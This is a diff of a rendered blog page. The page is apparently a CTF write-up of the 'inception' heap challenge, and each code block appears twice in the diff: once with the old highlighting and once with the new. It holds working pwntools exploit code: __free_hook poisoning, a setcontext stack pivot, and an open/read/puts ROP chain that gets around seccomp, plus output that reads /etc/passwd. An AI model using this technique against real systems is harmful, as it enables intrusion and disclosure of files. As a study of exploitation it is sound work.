+</span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">(</span><span class="mh">0x60</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">gadget</span><span class="p">))</span>                                <span class="c1"># overwrite __free_hook with the address of the setcontext gadget</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">ropchain</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">ropchain</span> <span class="o">=</span> <span class="n">ropchain</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0xa0</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">)</span>              <span class="c1"># We could set the other register to useful values, but we have a lot of space so this is fine</span>
+</span></span><span class="line"><span class="cl"><span class="n">ropchain</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">rsp_value</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">ropchain</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">rcx_value</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">(</span><span class="mh">0x800</span><span class="p">,</span> <span class="n">ropchain</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">delete</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span>                                             <span class="c1"># triggers __free_hook with a pointer to our chunk with the ropchain in rdi</span>
 </span></span></code></pre></div><p>Notice that there is some padding before the <code>rsp_value</code>, this is be cause the value will be taken from <code>rdi + 0xa0</code>.
 What value do we put for <code>rsp</code> and <code>rcx</code> ? Because <code>rcx</code> will be pushed to the new stack, we need to be precise to not overwrite important part of the ropchain.
 First, the easy part : for <code>rcx_value</code>, we will put the address of a <code>ret</code> instruction, this way we can follow with a normal ropchain, ignoring this gadget.</p>
 <p>For <code>rsp_value</code>, I will set it to be right after <code>rcx_value</code>, this way, when the <code>push rcx</code> happens, it pushes the address of the <code>ret</code> over &hellip; <code>rcx_value</code>, then when the <code>ret</code> of <code>setcontext</code> executes, it will pop the value that was just pushed into <code>rip</code>, executes the <code>ret</code>, and we can follow with a normal ropchain.
 We can do this because we leaked the heap earlier.</p>
-<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>free_hook = libc_base + libc.symbols[<span style="color:#a31515">&#39;__free_hook&#39;</span>]
-</span></span><span style="display:flex;"><span>gadget = libc_base + 0x521b5
-</span></span><span style="display:flex;"><span>ret = libc_base + 0x521ff
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>add(0x60, <span style="color:#a31515">b</span><span style="color:#a31515">&#39;eeee&#39;</span>)
-</span></span><span style="display:flex;"><span>delete(2)
-</span></span><span style="display:flex;"><span>edit(1, p64(free_hook))
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>add(0x60, <span style="color:#a31515">b</span><span style="color:#a31515">&#39;/home/user/flag.txt</span><span style="color:#a31515">\x00</span><span style="color:#a31515">&#39;</span>)
-</span></span><span style="display:flex;"><span>add(0x60, p64(gadget))
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>rsp_value = heap_base + 0xfd0                         <span style="color:#008000"># Calculated using a debugger</span>
-</span></span><span style="display:flex;"><span>rcx_value = ret
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>ropchain = <span style="color:#a31515">b</span><span style="color:#a31515">&#34;&#34;</span>
-</span></span><span style="display:flex;"><span>ropchain = ropchain.ljust(0xa0, <span style="color:#a31515">b</span><span style="color:#a31515">&#39;</span><span style="color:#a31515">\x00</span><span style="color:#a31515">&#39;</span>)
-</span></span><span style="display:flex;"><span>ropchain += p64(rsp_value)
-</span></span><span style="display:flex;"><span>ropchain += p64(rcx_value)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>add(0x800, ropchain)
-</span></span><span style="display:flex;"><span>delete(5)                                             <span style="color:#008000"># triggers __free_hook with a pointer to our chunk with the ropchain in rdi</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">free_hook</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;__free_hook&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="n">gadget</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x521b5</span>
+</span></span><span class="line"><span class="cl"><span class="n">ret</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x521ff</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">(</span><span class="mh">0x60</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;eeee&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">delete</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">edit</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">free_hook</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">(</span><span class="mh">0x60</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;/home/user/flag.txt</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">(</span><span class="mh">0x60</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">gadget</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">rsp_value</span> <span class="o">=</span> <span class="n">heap_base</span> <span class="o">+</span> <span class="mh">0xfd0</span>                         <span class="c1"># Calculated using a debugger</span>
+</span></span><span class="line"><span class="cl"><span class="n">rcx_value</span> <span class="o">=</span> <span class="n">ret</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">ropchain</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">ropchain</span> <span class="o">=</span> <span class="n">ropchain</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0xa0</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">ropchain</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">rsp_value</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">ropchain</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">rcx_value</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">(</span><span class="mh">0x800</span><span class="p">,</span> <span class="n">ropchain</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">delete</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span>                                             <span class="c1"># triggers __free_hook with a pointer to our chunk with the ropchain in rdi</span>
 </span></span></code></pre></div><p>Next, we can use <code>mprotect</code> (which is allowed by seccomp) to turn the heap executable, or simply continue with a ropchain, which I&rsquo;ll do here.
 We have to <code>open</code> the file, <code>read</code> from the corresponding file descriptor, and <code>write</code> it to stdout. For both <code>read</code> and <code>write</code>, we can use the wrappers inside of libc, however, we cannot use the open for open, which uses the <code>shmctl</code> syscall, which is not permitted by seccomp. So for open, we will make the syscall directly.</p>
-<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>free_hook = libc_base + libc.symbols[<span style="color:#a31515">&#39;__free_hook&#39;</span>]
-</span></span><span style="display:flex;"><span>gadget = libc_base + 0x521b5
-</span></span><span style="display:flex;"><span>ret = libc_base + 0x521ff
-</span></span><span style="display:flex;"><span>pop_rax = libc_base + 0x43ae8
-</span></span><span style="display:flex;"><span>pop_rsi = libc_base + 0x23eea
-</span></span><span style="display:flex;"><span>pop_rdi = libc_base + 0x215bf
-</span></span><span style="display:flex;"><span>pop_rdx = libc_base + 0x1b96
-</span></span><span style="display:flex;"><span>syscall = libc_base + 0xd2745
-</span></span><span style="display:flex;"><span>read = libc_base + libc.symbols[<span style="color:#a31515">&#39;read&#39;</span>]
-</span></span><span style="display:flex;"><span>puts = libc_base + libc.symbols[<span style="color:#a31515">&#39;puts&#39;</span>]
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>add(0x60, <span style="color:#a31515">b</span><span style="color:#a31515">&#39;eeee&#39;</span>)
-</span></span><span style="display:flex;"><span>delete(2)
-</span></span><span style="display:flex;"><span>edit(1, p64(free_hook))
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>add(0x60, <span style="color:#a31515">b</span><span style="color:#a31515">&#39;/home/user/flag.txt</span><span style="color:#a31515">\x00</span><span style="color:#a31515">&#39;</span>)
-</span></span><span style="display:flex;"><span>add(0x60, p64(gadget))
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>rsp_value = heap_base + 0xfd0                         <span style="color:#008000"># Calculated using a debugger</span>
-</span></span><span style="display:flex;"><span>rcx_value = ret
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>ropchain = <span style="color:#a31515">b</span><span style="color:#a31515">&#34;&#34;</span>
-</span></span><span style="display:flex;"><span>ropchain = ropchain.ljust(0xa0, <span style="color:#a31515">b</span><span style="color:#a31515">&#39;</span><span style="color:#a31515">\x00</span><span style="color:#a31515">&#39;</span>)
-</span></span><span style="display:flex;"><span>ropchain += p64(rsp_value)
-</span></span><span style="display:flex;"><span>ropchain += p64(rcx_value)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>ropchain += p64(pop_rax)                                <span style="color:#008000"># sets rax to the target syscall number</span>
-</span></span><span style="display:flex;"><span>ropchain += p64(2)                                      <span style="color:#008000"># SYS_OPEN</span>
-</span></span><span style="display:flex;"><span>ropchain += p64(pop_rdi)                                <span style="color:#008000"># pointer to path</span>
-</span></span><span style="display:flex;"><span>ropchain += p64(heap_base + 0x7a0)                      <span style="color:#008000"># address of string /home/user/flag.txt</span>
-</span></span><span style="display:flex;"><span>ropchain += p64(syscall)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>ropchain += p64(pop_rdi)                                <span style="color:#008000"># sets the fd value</span>
-</span></span><span style="display:flex;"><span>ropchain += p64(3)                                      <span style="color:#008000"># fd of the recently opened file</span>
-</span></span><span style="display:flex;"><span>ropchain += p64(pop_rsi)                                <span style="color:#008000"># sets the where the content will be written</span>
-</span></span><span style="display:flex;"><span>ropchain += p64(heap_base)                              <span style="color:#008000"># any writeable address</span>
-</span></span><span style="display:flex;"><span>ropchain += p64(pop_rdx)                                <span style="color:#008000"># sets the number of bytes to read</span>
-</span></span><span style="display:flex;"><span>ropchain += p64(0x100)
-</span></span><span style="display:flex;"><span>ropchain += p64(read)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>ropchain += p64(pop_rdi)                                <span style="color:#008000"># address of the data read</span>
-</span></span><span style="display:flex;"><span>ropchain += p64(heap_base)
-</span></span><span style="display:flex;"><span>ropchain += p64(puts)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>add(0x800, ropchain)
-</span></span><span style="display:flex;"><span>delete(5)                                               <span style="color:#008000"># triggers __free_hook with a pointer to our chunk with the ropchain in rdi</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">free_hook</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;__free_hook&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="n">gadget</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x521b5</span>
+</span></span><span class="line"><span class="cl"><span class="n">ret</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x521ff</span>
+</span></span><span class="line"><span class="cl"><span class="n">pop_rax</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x43ae8</span>
+</span></span><span class="line"><span class="cl"><span class="n">pop_rsi</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x23eea</span>
+</span></span><span class="line"><span class="cl"><span class="n">pop_rdi</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x215bf</span>
+</span></span><span class="line"><span class="cl"><span class="n">pop_rdx</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x1b96</span>
+</span></span><span class="line"><span class="cl"><span class="n">syscall</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0xd2745</span>
+</span></span><span class="line"><span class="cl"><span class="n">read</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;read&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="n">puts</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;puts&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">(</span><span class="mh">0x60</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;eeee&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">delete</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">edit</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">free_hook</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">(</span><span class="mh">0x60</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;/home/user/flag.txt</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">(</span><span class="mh">0x60</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">gadget</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">rsp_value</span> <span class="o">=</span> <span class="n">heap_base</span> <span class="o">+</span> <span class="mh">0xfd0</span>                         <span class="c1"># Calculated using a debugger</span>
+</span></span><span class="line"><span class="cl"><span class="n">rcx_value</span> <span class="o">=</span> <span class="n">ret</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">ropchain</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">ropchain</span> <span class="o">=</span> <span class="n">ropchain</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0xa0</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">ropchain</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">rsp_value</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">ropchain</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">rcx_value</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">ropchain</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rax</span><span class="p">)</span>                                <span class="c1"># sets rax to the target syscall number</span>
+</span></span><span class="line"><span class="cl"><span class="n">ropchain</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>                                      <span class="c1"># SYS_OPEN</span>
+</span></span><span class="line"><span class="cl"><span class="n">ropchain</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span>                                <span class="c1"># pointer to path</span>
+</span></span><span class="line"><span class="cl"><span class="n">ropchain</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">heap_base</span> <span class="o">+</span> <span class="mh">0x7a0</span><span class="p">)</span>                      <span class="c1"># address of string /home/user/flag.txt</span>
+</span></span><span class="line"><span class="cl"><span class="n">ropchain</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">syscall</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">ropchain</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span>                                <span class="c1"># sets the fd value</span>
+</span></span><span class="line"><span class="cl"><span class="n">ropchain</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>                                      <span class="c1"># fd of the recently opened file</span>
+</span></span><span class="line"><span class="cl"><span class="n">ropchain</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rsi</span><span class="p">)</span>                                <span class="c1"># sets the where the content will be written</span>
+</span></span><span class="line"><span class="cl"><span class="n">ropchain</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">heap_base</span><span class="p">)</span>                              <span class="c1"># any writeable address</span>
+</span></span><span class="line"><span class="cl"><span class="n">ropchain</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdx</span><span class="p">)</span>                                <span class="c1"># sets the number of bytes to read</span>
+</span></span><span class="line"><span class="cl"><span class="n">ropchain</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x100</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">ropchain</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">read</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">ropchain</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span>                                <span class="c1"># address of the data read</span>
+</span></span><span class="line"><span class="cl"><span class="n">ropchain</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">heap_base</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">ropchain</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">puts</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">(</span><span class="mh">0x800</span><span class="p">,</span> <span class="n">ropchain</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">delete</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span>                                               <span class="c1"># triggers __free_hook with a pointer to our chunk with the ropchain in rdi</span>
 </span></span></code></pre></div><p>This works ! At the time of writing, the server is not up anymore, however running it locally and changing the flag path to <code>/etc/passwd</code> gives the expected output :</p>
-<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ python3 test.py
-</span></span><span style="display:flex;"><span>...
-</span></span><span style="display:flex;"><span>[+] heap base : 0x559520a93000
-</span></span><span style="display:flex;"><span>[+] libc base : 0x7f0645cf0000
-</span></span><span style="display:flex;"><span>[*] Switching to interactive mode
-</span></span><span style="display:flex;"><span>root:x:0:0::/root:/bin/bash
-</span></span><span style="display:flex;"><span>...
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">$ python3 test.py
+</span></span><span class="line"><span class="cl">...
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> heap base : 0x559520a93000
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> libc base : 0x7f0645cf0000
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Switching to interactive mode
+</span></span><span class="line"><span class="cl">root:x:0:0::/root:/bin/bash
+</span></span><span class="line"><span class="cl">...
 </span></span></code></pre></div><p>When running it remotely, I just had to change the fd of the open file to be 5 instead of 3, probably because the program had additionnal open file descriptors due to the remote connection.</p>
 <p>This was a nice challenge :)</p>
 <h2 id="full-exploit">Full exploit</h2>
-<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#00f">from</span> pwn <span style="color:#00f">import</span> *
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>context.terminal=[<span style="color:#a31515">&#34;tmux&#34;</span>, <span style="color:#a31515">&#34;split-w&#34;</span>]
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>p = process(<span style="color:#a31515">&#34;./inception_patched&#34;</span>)
-</span></span><span style="display:flex;"><span><span style="color:#008000">#p = remote(&#34;remote1.thcon.party&#34;, 10904)</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>libc = ELF(<span style="color:#a31515">&#34;./libc.so.6&#34;</span>)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#00f">def</span> add(size, data):
-</span></span><span style="display:flex;"><span> p.recvuntil(<span style="color:#a31515">b</span><span style="color:#a31515">&#39;&gt; &#39;</span>)
-</span></span><span style="display:flex;"><span> p.sendline(<span style="color:#a31515">&#39;1&#39;</span>)
-</span></span><span style="display:flex;"><span> p.recvuntil(<span style="color:#a31515">b</span><span style="color:#a31515">&#39;: &#39;</span>)
-</span></span><span style="display:flex;"><span> p.sendline(str(size))
-</span></span><span style="display:flex;"><span> p.recvuntil(<span style="color:#a31515">b</span><span style="color:#a31515">&#39;: &#39;</span>)
-</span></span><span style="display:flex;"><span> p.send(data)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#00f">def</span> delete(idx):
-</span></span><span style="display:flex;"><span> p.recvuntil(<span style="color:#a31515">b</span><span style="color:#a31515">&#39;&gt; &#39;</span>)
-</span></span><span style="display:flex;"><span> p.sendline(<span style="color:#a31515">&#39;2&#39;</span>)
-</span></span><span style="display:flex;"><span> p.recvuntil(<span style="color:#a31515">b</span><span style="color:#a31515">&#39;: &#39;</span>)
-</span></span><span style="display:flex;"><span> p.sendline(str(idx))
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#00f">def</span> edit(idx, data):
-</span></span><span style="display:flex;"><span> p.recvuntil(<span style="color:#a31515">b</span><span style="color:#a31515">&#39;&gt; &#39;</span>)
-</span></span><span style="display:flex;"><span> p.sendline(<span style="color:#a31515">&#39;3&#39;</span>)
-</span></span><span style="display:flex;"><span> p.recvuntil(<span style="color:#a31515">b</span><span style="color:#a31515">&#39;: &#39;</span>)
-</span></span><span style="display:flex;"><span> p.sendline(str(idx))
-</span></span><span style="display:flex;"><span> p.recvuntil(<span style="color:#a31515">b</span><span style="color:#a31515">&#39;: &#39;</span>)
-</span></span><span style="display:flex;"><span> p.sendline(data)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#00f">def</span> view(idx):
-</span></span><span style="display:flex;"><span> p.recvuntil(<span style="color:#a31515">b</span><span style="color:#a31515">&#39;&gt; &#39;</span>)
-</span></span><span style="display:flex;"><span> p.sendline(<span style="color:#a31515">&#39;4&#39;</span>)
-</span></span><span style="display:flex;"><span> p.recvuntil(<span style="color:#a31515">b</span><span style="color:#a31515">&#39;: &#39;</span>)
-</span></span><span style="display:flex;"><span> p.sendline(str(idx))
-</span></span><span style="display:flex;"><span> p.recvuntil(<span style="color:#a31515">b</span><span style="color:#a31515">&#39;: &#39;</span>)
-</span></span><span style="display:flex;"><span> data = p.recvuntil(<span style="color:#a31515">b</span><span style="color:#a31515">&#39;-= Dream&#39;</span>)
-</span></span><span style="display:flex;"><span> <span style="color:#00f">return</span> data
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>add(0x10, <span style="color:#a31515">&#39;azer&#39;</span>)
-</span></span><span style="display:flex;"><span>add(0x10, <span style="color:#a31515">&#39;azer&#39;</span>)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>delete(0)
-</span></span><span style="display:flex;"><span>delete(1)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>add(0x10, <span style="color:#a31515">&#39;0&#39;</span>)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>leak = view(0)
-</span></span><span style="display:flex;"><span>heap_leak = u64(leak[:6].ljust(8, <span style="color:#a31515">b</span><span style="color:#a31515">&#39;</span><span style="color:#a31515">\x00</span><span style="color:#a31515">&#39;</span>))
-</span></span><span style="display:flex;"><span>heap_base = heap_leak &amp; ~0xfff
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>log.success(<span style="color:#a31515">f</span><span style="color:#a31515">&#34;heap base : </span><span style="color:#a31515">{</span>hex(heap_base)<span style="color:#a31515">}</span><span style="color:#a31515">&#34;</span>)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>delete(0)
-</span></span><span style="display:flex;"><span>delete(1)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>add(0x4f0, <span style="color:#a31515">b</span><span style="color:#a31515">&#39;aaaa&#39;</span>)
-</span></span><span style="display:flex;"><span>add(0x68, <span style="color:#a31515">b</span><span style="color:#a31515">&#39;bbbb&#39;</span>)
-</span></span><span style="display:flex;"><span>add(0x4f0, <span style="color:#a31515">b</span><span style="color:#a31515">&#39;cccc&#39;</span>)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>add(0x200, <span style="color:#a31515">b</span><span style="color:#a31515">&#39;dddd&#39;</span>)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>delete(0)
-</span></span><span style="display:flex;"><span>edit(1, <span style="color:#a31515">b</span><span style="color:#a31515">&#39;B&#39;</span>*0x60 + p64(0x570))
-</span></span><span style="display:flex;"><span>delete(2)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>add(0x4f0, <span style="color:#a31515">b</span><span style="color:#a31515">&#39;push&#39;</span>)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>data = view(1)
-</span></span><span style="display:flex;"><span>libc_leak = u64(data[:6].strip().ljust(8, <span style="color:#a31515">b</span><span style="color:#a31515">&#39;</span><span style="color:#a31515">\x00</span><span style="color:#a31515">&#39;</span>))
-</span></span><span style="display:flex;"><span>libc_base = libc_leak - 0x3ebca0
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>log.success(<span style="color:#a31515">f</span><span style="color:#a31515">&#34;libc base : </span><span style="color:#a31515">{</span>hex(libc_base)<span style="color:#a31515">}</span><span style="color:#a31515">&#34;</span>)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>free_hook = libc_base + libc.symbols[<span style="color:#a31515">&#39;__free_hook&#39;</span>]
-</span></span><span style="display:flex;"><span>gadget = libc_base + 0x521b5
-</span></span><span style="display:flex;"><span>ret = libc_base + 0x521ff
-</span></span><span style="display:flex;"><span>pop_rax = libc_base + 0x43ae8
-</span></span><span style="display:flex;"><span>pop_rsi = libc_base + 0x23eea
-</span></span><span style="display:flex;"><span>pop_rdi = libc_base + 0x215bf
-</span></span><span style="display:flex;"><span>pop_rdx = libc_base + 0x1b96
-</span></span><span style="display:flex;"><span>syscall = libc_base + 0xd2745
-</span></span><span style="display:flex;"><span>read = libc_base + libc.symbols[<span style="color:#a31515">&#39;read&#39;</span>]
-</span></span><span style="display:flex;"><span>puts = libc_base + libc.symbols[<span style="color:#a31515">&#39;puts&#39;</span>]
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>add(0x60, <span style="color:#a31515">b</span><span style="color:#a31515">&#39;eeee&#39;</span>)
-</span></span><span style="display:flex;"><span>delete(2)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>edit(1, p64(free_hook))
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>add(0x60, <span style="color:#a31515">b</span><span style="color:#a31515">&#39;/etc/passwd</span><span style="color:#a31515">\x00</span><span style="color:#a31515">&#39;</span>)
-</span></span><span style="display:flex;"><span>add(0x60, p64(gadget))
